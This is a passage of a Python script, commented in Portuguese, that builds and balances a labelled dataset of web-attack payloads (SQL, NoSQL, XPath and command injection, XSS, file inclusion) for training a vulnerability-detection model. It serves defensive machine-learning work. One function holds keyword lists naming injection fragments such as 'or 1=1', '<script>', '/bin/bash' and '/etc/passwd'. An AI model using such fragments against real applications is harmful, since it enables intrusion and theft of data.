            resposta_segura = gerar_resposta_http(payload_seguro, tipo_vulnerabilidade, contexto, sucesso=False)

            dados.append({
                "text": resposta_segura,
                "label": 0,
                "tipo_payload": tipo_vulnerabilidade
            })

    return dados

# Função para carregar dados existentes
def carregar_dados_existentes():
    """Carrega dados existentes do sistema"""
    dados = []

    # Procura por arquivos CSV no diretório de dados
    for arquivo in os.listdir(OUTPUT_DIR):
        if arquivo.endswith('.csv') and 'sinteticos' not in arquivo and 'combinados' not in arquivo:
            caminho = os.path.join(OUTPUT_DIR, arquivo)
            try:
                print(f"{Fore.BLUE}[*] Carregando dados existentes de {arquivo}")
                df = pd.read_csv(caminho)

                # Verifica se tem as colunas necessárias
                if 'text' in df.columns and 'label' in df.columns:
                    # Adiciona tipo_payload se não existir
                    if 'tipo_payload' not in df.columns:
                        df['tipo_payload'] = df.apply(
                            lambda row: detectar_tipo_vulnerabilidade(row['text']), axis=1)

                    # Converte para lista de dicionários
                    registros = df.to_dict('records')
                    dados.extend(registros)
                    print(f"{Fore.GREEN}[+] Carregados {len(registros)} registros de {arquivo}")
            except Exception as e:
                print(f"{Fore.RED}[!] Erro ao carregar {arquivo}: {str(e)}")

    print(f"{Fore.GREEN}[+] Total de {len(dados)} registros carregados de arquivos existentes")

    return dados

# Função para detectar tipo de vulnerabilidade
def detectar_tipo_vulnerabilidade(texto):
    """Detecta o tipo de vulnerabilidade com base no conteúdo do texto"""
    texto_lower = texto.lower()

    if any(termo in texto_lower for termo in ['sql', 'select', 'union', 'from users', 'or 1=1']):
        return "sqli"
    elif any(termo in texto_lower for termo in ['<script>', 'alert(', 'onerror=', 'onload=', 'javascript:']):
        return "xss"
    elif any(termo in texto_lower for termo in ['cmd', '/bin/bash', 'whoami', '/etc/passwd', '| ls', '; ls']):
        return "cmd"
    elif any(termo in texto_lower for termo in ['$gt', '$ne', '$where', 'mongodb', '$regex']):
        return "nosqli"
    elif any(termo in texto_lower for termo in ['../..', 'file://', '/etc/passwd', 'c:\\windows', 'php://']):
        return "lfi_rfi"
    elif any(termo in texto_lower for termo in ['xpath', '//user', 'node()', '//*']):
        return "xpath"
    else:
        # Default para o tipo mais comum
        return "sqli"

# Função para combinar e equilibrar os dados
def combinar_equilibrar_dados(dados_sinteticos, dados_publicos, dados_existentes, total_desejado=50000):
    """Combina e equilibra diferentes fontes de dados para criar um conjunto final"""
    # Combina todas as fontes
    todos_dados = dados_sinteticos + dados_publicos + dados_existentes

    # Verifica total atual
    total_atual = len(todos_dados)
    print(f"{Fore.BLUE}[*] Total de dados antes do balanceamento: {total_atual}")

    # Contabiliza por tipo e label
    contagem = {}
    for tipo in ["sqli", "xss", "cmd", "nosqli", "lfi_rfi", "xpath"]:
        contagem[tipo] = {
            0: len([d for d in todos_dados if d["tipo_payload"] == tipo and d["label"] == 0]),
            1: len([d for d in todos_dados if d["tipo_payload"] == tipo and d["label"] == 1])
        }

    # Exibe estatísticas iniciais
    print(f"{Fore.BLUE}[*] Distribuição inicial:")
    for tipo, labels in contagem.items():
        total_tipo = labels[0] + labels[1]
        if total_tipo > 0:
            porcentagem_pos = (labels[1] / total_tipo) * 100
            print(f"  - {tipo}: {total_tipo} exemplos ({labels[1]} positivos = {porcentagem_pos:.1f}%)")

    # Se tiver mais exemplos que o necessário, equilibra
    if total_atual > total_desejado:
        print(f"{Fore.BLUE}[*] Reduzindo conjunto de dados para {total_desejado} exemplos mantendo equilíbrio...")

        # Distribui o total desejado entre os tipos proporcionalmente
        distribuicao_desejada = {}
        for tipo in contagem.keys():
            total_tipo = contagem[tipo][0] + contagem[tipo][1]
            if total_tipo > 0:
                proporcao = total_tipo / total_atual
                distribuicao_desejada[tipo] = int(total_desejado * proporcao)

        # Garante que a soma não ultrapasse o total desejado
        soma_distribuicao = sum(distribuicao_desejada.values())
        if soma_distribuicao > total_desejado:
            # Ajusta proporcionalmente
            fator = total_desejado / soma_distribuicao
            for tipo in distribuicao_desejada:
                distribuicao_desejada[tipo] = int(distribuicao_desejada[tipo] * fator)

        # Seleciona aleatoriamente mantendo a proporção por tipo
        dados_equilibrados = []
        for tipo, quantidade in distribuicao_desejada.items():
            # Filtra dados deste tipo
            dados_tipo = [d for d in todos_dados if d["tipo_payload"] == tipo]

            # Calcula número desejado por label para manter equilíbrio
            if quantidade > 0 and dados_tipo:
                # Tenta manter 50/50 entre vulneráveis e não vulneráveis
                num_positivos = min(quantidade // 2, contagem[tipo][1])
                num_negativos = min(quantidade - num_positivos, contagem[tipo][0])

                # Se não tiver exemplos suficientes de um tipo, compensa com o outro
                if num_positivos < quantidade // 2 and num_negativos > quantidade - num_positivos:
                    num_negativos = min(quantidade - num_positivos, contagem[tipo][0])
                elif num_negativos < quantidade // 2 and num_positivos > quantidade - num_negativos:
                    num_positivos = min(quantidade - num_negativos, contagem[tipo][1])

                # Seleciona exemplos aleatoriamente
                positivos = random.sample([d for d in dados_tipo if d["label"] == 1], num_positivos)
                negativos = random.sample([d for d in dados_tipo if d["label"] == 0], num_negativos)

                # Adiciona aos dados equilibrados
                dados_equilibrados.extend(positivos)
                dados_equilibrados.extend(negativos)

        # Atualiza todos_dados
        todos_dados = dados_equilibrados

    # Exibe estatísticas finais
    print(f"{Fore.GREEN}[+] Conjunto de dados final: {len(todos_dados)} exemplos")

    # Contabiliza por tipo e label novamente
    contagem_final = {}
    for tipo in ["sqli", "xss", "cmd", "nosqli", "lfi_rfi", "xpath"]:
        contagem_final[tipo] = {
            0: len([d for d in todos_dados if d["tipo_payload"] == tipo and d["label"] == 0]),
            1: len([d for d in todos_dados if d["tipo_payload"] == tipo and d["label"] == 1])
        }

    print(f"{Fore.BLUE}[*] Distribuição final:")
    for tipo, labels in contagem_final.items():
        total_tipo = labels[0] + labels[1]
        if total_tipo > 0:
            porcentagem_pos = (labels[1] / total_tipo) * 100
            print(f"  - {tipo}: {total_tipo} exemplos ({labels[1]} positivos = {porcentagem_pos:.1f}%)")

    return todos_dados

# Função principal
def main():
    """Função principal do gerador de dados sintéticos"""
    print(f"{Fore.CYAN}===== Gerador de Dados Sintéticos para Vulnerabilidades Web =====")
    print(f"{Fore.YELLOW}Este script gera um conjunto de dados de alta qualidade para treinar")
    print(f"{Fore.YELLOW}modelos de detecção de vulnerabilidades em aplicações web.\n")

    # Configurar argumentos de linha de comando
    import argparse
    parser = argparse.ArgumentParser(description='Gerador de Dados Sintéticos para Vulnerabilidades Web')
    parser.add_argument('--num_exemplos', '-n', type=int, default=10000, 
                        help='Número total de exemplos sintéticos a gerar (padrão: 10000)')
    parser.add_argument('--num_final', '-f', type=int, default=50000, 
                        help='Tamanho final desejado do conjunto de dados combinado (padrão: 50000)')
    parser.add_argument('--no_download', '-nd', action='store_true', 
                        help='Não baixar dados públicos da internet')
    parser.add_argument('--no_existentes', '-ne', action='store_true', 
                        help='Não usar dados existentes do sistema')
    parser.add_argument('--apenas_sinteticos', '-as', action='store_true', 
                        help='Usar apenas dados sintéticos gerados')
    args = parser.parse_args()

    # Imprime configurações
    print(f"{Fore.BLUE}[*] Configurações:")
    print(f"  - Número de exemplos sintéticos: {args.num_exemplos}")
    print(f"  - Tamanho final desejado: {args.num_final}")
    print(f"  - Baixar dados públicos: {not args.no_download}")
    print(f"  - Usar dados existentes: {not args.no_existentes}")
    print(f"  - Modo apenas sintéticos: {args.apenas_sinteticos}")

    # Se modo apenas sintéticos estiver ativado, desativa as outras fontes
    if args.apenas_sinteticos:
        args.no_download = True
        args.no_existentes = True

    # 1. Gerar dados sintéticos
    dados_sinteticos = gerar_dados_sinteticos(args.num_exemplos)

    # 2. Baixar conjuntos de dados públicos (se habilitado)
    dados_publicos = []
    if not args.no_download:
        dados_publicos = baixar_dados_publicos()

    # 3. Carregar dados existentes (se habilitado)
    dados_existentes = []
    if not args.no_existentes:
        dados_existentes = carregar_dados_existentes()

    # 4. Combinar e equilibrar os dados
    dados_combinados = combinar_equilibrar_dados(
        dados_sinteticos, dados_publicos, dados_existentes, args.num_final)

    # 5. Salvar resultados
    try:
        # Converte para DataFrame
        df_sinteticos = pd.DataFrame(dados_sinteticos)
        df_combinados = pd.DataFrame(dados_combinados)

        # Salva dados sintéticos
        df_sinteticos.to_csv(SYNTHETIC_OUTPUT_FILE, index=False)
        print(f"{Fore.GREEN}[+] Dados sintéticos salvos em {SYNTHETIC_OUTPUT_FILE}")

        # Salva dados combinados
        df_combinados.to_csv(COMBINED_OUTPUT_FILE, index=False)
        print(f"{Fore.GREEN}[+] Dados combinados salvos em {COMBINED_OUTPUT_FILE}")

        # Atualiza também os dados processados usados pelo sistema
        dados_processados = os.path.join(OUTPUT_DIR, "dados_processados.csv")
        df_combinados.to_csv(dados_processados, index=False)
        print(f"{Fore.GREEN}[+] Dados de treinamento atualizados em {dados_processados}")

    except Exception as e:
        print(f"{Fore.RED}[!] Erro ao salvar resultados: {str(e)}")

    print(f"\n{Fore.GREEN}[+] Processo concluído com sucesso!")
    print(f"{Fore.GREEN}[+] Agora você pode treinar seu modelo com:")
    print(f"{Fore.GREEN}    python treinar_modelo.py")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Operação interrompida pelo usuário.")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Erro durante a execução: {str(e)}")
        import traceback
        traceback.print_exc()
